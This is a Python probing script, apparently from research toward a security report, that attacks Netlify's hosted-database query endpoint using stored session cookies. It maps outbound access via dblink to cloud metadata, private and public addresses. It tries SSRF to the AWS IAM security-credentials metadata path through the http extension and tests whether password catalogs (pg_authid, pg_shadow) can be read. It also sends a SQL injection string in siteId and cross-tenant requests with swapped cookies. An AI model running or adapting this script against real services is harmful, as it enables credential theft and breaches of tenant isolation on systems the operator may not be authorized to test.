# -*- coding: utf-8 -*-
"""新方向扫描(不触碰已提交的 pg_repack 链):
A. 出站矩阵精确判定(dblink_connect + connect_timeout=8,修正旧 fdw_test 忘建 user mapping 的缺陷)
   重点:云元数据 169.254.169.254 / 公网 DNS+IP / RFC1918 / Netlify 基础设施
   目的:验证已提交 comment 中 "no working outbound network" 表述是否准确
B. 目录面:pg_authid 可读性、角色成员、事件触发器、预置 FDW 对象、可用扩展
C. HTTP 扩展尝试(http / pg_net) -> 若装上立即测元数据 SSRF(可读响应体)
D. database-query 函数面:action 枚举 + siteId 注入探测(仅观察错误)
零破坏:create if not exists + 结束时恢复原扩展集合;临时对象 cx/k 前缀
"""
import http.client, ssl, gzip, brotli, json, sys, itertools
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A, COOKIE_B

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()
HOST = 'app.netlify.com'
PATH = '/.netlify/functions/database-query'


def _req(body, cookie=COOKIE_A, timeout=40):
    conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': cookie}
    conn.request('POST', PATH, body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:4000].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'HTTP-EXC %r' % e
    finally:
        conn.close()
    return st, out


def q(sql, timeout=40, trunc=2000):
    st, out = _req({'siteId': SITE_A, 'action': 'query', 'sql': sql}, timeout=timeout)
    return st, out[:trunc]


def show(label, sql, trunc=1600, timeout=40):
    st, out = q(sql, timeout, trunc)
    print('%-46s [%d] %s' % (label, st, out.replace('\n', ' | ')[:trunc]))
    return st, out


_seq = itertools.count(1)


def eg(label, host, port=5432, cto='8'):
    """dblink 单次连接探测:错误类型区分 可达/拒连/超时/黑洞"""
    n = 'cx%d' % next(_seq)
    cs = "host=%s port=%s dbname=x user=x connect_timeout=%s" % (host, port, cto)
    st, out = q("select dblink_connect('%s','%s')" % (n, cs), timeout=45, trunc=400)
    print('%-44s [%d] %s' % (label, st, out.replace('\n', ' | ')[:400]))
    try:
        q("select dblink_disconnect('%s')" % n, timeout=8)
    except Exception:
        pass


print('========== 0. 扩展现状 & 确保 dblink ==========')
st, out = q("select extname from pg_extension order by 1", trunc=600)
print('当前已装扩展: %s' % out)
ext_had_dblink = 'dblink' in out
q("create extension if not exists dblink", timeout=30)
print('dblink 就绪(原先存在=%s)' % ext_had_dblink)

print()
print('========== A. 出站矩阵(dblink_connect, connect_timeout=8) ==========')
eg('ctrl A endpoint', 'ep-autumn-cherry-ay51mbqz.c-5.us-east-2.db.netlify.com')
eg('ctrl B 新 endpoint', 'ep-lucky-sound-aeh4epbm.c-2.us-east-2.db.netlify.com')
eg('旧 B endpoint(轮换判定)', 'ep-cold-unit-ae9s4l3i.c-2.us-east-2.db.netlify.com')
eg('裸 proxy db.netlify.com', 'db.netlify.com')
eg('公网DNS example.com:80', 'example.com', 80)
eg('公网DNS example.com:443', 'example.com', 443)
eg('NXDOMAIN 基线 .invalid', 'nonexistent-zz-12345.invalid', 80)
eg('元数据 169.254.169.254:80', '169.254.169.254', 80)
eg('元数据 169.254.169.254:443', '169.254.169.254', 443)
eg('元数据 169.254.169.254:5432', '169.254.169.254', 5432)
eg('ECS元数据 169.254.170.2:80', '169.254.170.2', 80)
eg('公网 1.1.1.1:80', '1.1.1.1', 80)
eg('公网 1.1.1.1:443', '1.1.1.1', 443)
eg('公网 1.1.1.1:5432', '1.1.1.1', 5432)
eg('公网 8.8.8.8:80', '8.8.8.8', 80)
eg('公网 8.8.8.8:53', '8.8.8.8', 53)
eg('Netlify api.netlify.com:443', 'api.netlify.com', 443)
eg('Netlify app.netlify.com:443', 'app.netlify.com', 443)
eg('RFC1918 10.0.0.1:5432', '10.0.0.1')
eg('RFC1918 172.16.0.1:5432', '172.16.0.1')
eg('RFC1918 192.168.1.1:5432', '192.168.1.1')

print()
print('========== B. 目录面 ==========')
show('会话信息', "select current_user, session_user, inet_server_addr(), inet_server_port(), pg_backend_pid()", 500)
show('自身连接来源', "select client_addr, client_port, application_name, backend_type from pg_stat_activity where pid = pg_backend_pid()", 500)
show('pg_authid 可读性', 'select count(*) from pg_authid', 500)
show('pg_shadow 可读性', 'select count(*) from pg_shadow', 500)
show('角色属性', "select rolname, rolsuper, rolcreaterole, rolcreatedb, rolbypassrls, rolreplication, rolcanlogin "
     "from pg_roles where rolname in ('cloud_admin','neon_superuser','netlifydb_owner') order by 1", 800)
show('成员关系检查', "select pg_has_role('netlifydb_owner','cloud_admin','member') as m_cloud_admin, "
     "pg_has_role('netlifydb_owner','pg_read_server_files','member') as m_read_files, "
     "pg_has_role('netlifydb_owner','pg_execute_server_program','member') as m_exec_prog, "
     "pg_has_role('netlifydb_owner','pg_write_server_files','member') as m_write_files", 500)
show('事件触发器', 'select evtname, evtevent, evtenabled from pg_event_trigger', 500)
show('预置 foreign server', 'select srvname, srvtype, srvversion, srvoptions from pg_foreign_server', 800)
show('预置 user mapping', "select s.srvname, u.usename, u.umoptions from pg_user_mappings u "
     "join pg_foreign_server s on s.oid = u.srvserver", 800)
show('预置 foreign table', "select n.nspname||'.'||c.relname from pg_class c join pg_namespace n on c.relnamespace=n.oid "
     "join pg_foreign_table ft on ft.ftrelid = c.oid", 800)
show('可用扩展(筛选)', "select name, default_version, installed_version from pg_available_extensions "
     "where name in ('http','pg_net','timescaledb','pg_partman','pg_cron','rag_bge_small_en_v15',"
     "'rag_jina_reranker_v1_tiny_en','dblink','postgres_fdw','pg_repack','plpython3u','pgcrypto',"
     "'uuid-ossp','pg_stat_statements','vector','lakebase_vector','lakebase_text','file_fdw',"
     "'pageinspect','pg_buffercache','pg_visibility','amcheck') order by 1", 2000)

print()
print('========== C. HTTP 扩展尝试(http/pg_net) ==========')
created = []
for ext in ('http', 'pg_net'):
    st, out = q("create extension if not exists %s" % ext, timeout=30, trunc=600)
    print('create %-6s [%d] %s' % (ext, st, out.replace('\n', ' ')[:600]))
    if 'CREATE EXTENSION' in out:
        created.append(ext)

if 'http' in created:
    print('-- http 扩展可用,测出站 HTTP(超时 8s) --')
    show('公网控制 example.com', "select (h.r).status, left((h.r).content, 300) from "
         "(select http(ROW('http://example.com/','GET',NULL,NULL,NULL,8000)::http_request) as r) h", 600, 25)
    for u in ('http://169.254.169.254/latest/meta-data/',
              'http://169.254.169.254/latest/meta-data/iam/security-credentials/'):
        show('元数据 ' + u[:45], "select (h.r).status, left(coalesce((h.r).content,''), 500) from "
             "(select http(ROW('%s','GET',NULL,NULL,NULL,8000)::http_request) as r) h" % u, 700, 25)

if 'pg_net' in created:
    show('pg_net 出站尝试', "select net.http_get('http://example.com/')", 400, 25)

print()
print('========== D. database-query 函数面 ==========')
cases = [
    ('ctrl A site', {'siteId': SITE_A, 'action': 'query', 'sql': 'select 1'}, COOKIE_A),
    ('随机 uuid', {'siteId': '11111111-2222-3333-4444-555555555555', 'action': 'query', 'sql': 'select 1'}, COOKIE_A),
    ('SQLi-close 探测', {'siteId': SITE_A[:-1] + "' OR '1'='1' --", 'action': 'query', 'sql': 'select 1'}, COOKIE_A),
    ('非 uuid 字符串', {'siteId': 'abc123', 'action': 'query', 'sql': 'select 1'}, COOKIE_A),
    ('跨队 B site + A cookie', {'siteId': SITE_B, 'action': 'query', 'sql': 'select 1'}, COOKIE_A),
    ('跨队 A site + B cookie', {'siteId': SITE_A, 'action': 'query', 'sql': 'select 1'}, COOKIE_B),
    ('缺 siteId', {'action': 'query', 'sql': 'select 1'}, COOKIE_A),
    ('dbname=postgres 参数', {'siteId': SITE_A, 'action': 'query', 'sql': 'select current_database()', 'dbname': 'postgres'}, COOKIE_A),
]
for label, body, cookie in cases:
    st, out = _req(body, cookie=cookie, timeout=20)
    print('%-24s [%d] %s' % (label, st, out[:220].replace('\n', ' ')))

for act in ('query', 'QUERY', 'exec', 'run', 'sql', 'connect', 'ping', 'meta',
            'describe', 'status', 'version', 'help', 'actions'):
    st, out = _req({'siteId': SITE_A, 'action': act, 'sql': 'select 1'}, timeout=20)
    print('action=%-10s [%d] %s' % (act, st, out[:160].replace('\n', ' ')))

print()
print('========== 清理 ==========')
for ext in created:
    st, out = q("drop extension if exists %s cascade" % ext, timeout=30, trunc=300)
    print('drop %-6s [%d] %s' % (ext, st, out[:200]))
if not ext_had_dblink:
    q("drop extension if exists dblink cascade", timeout=30)
    print('dblink(本次新建)已清理')
st, out = q("select extname from pg_extension order by 1", trunc=600)
print('清理后扩展: %s' % out)
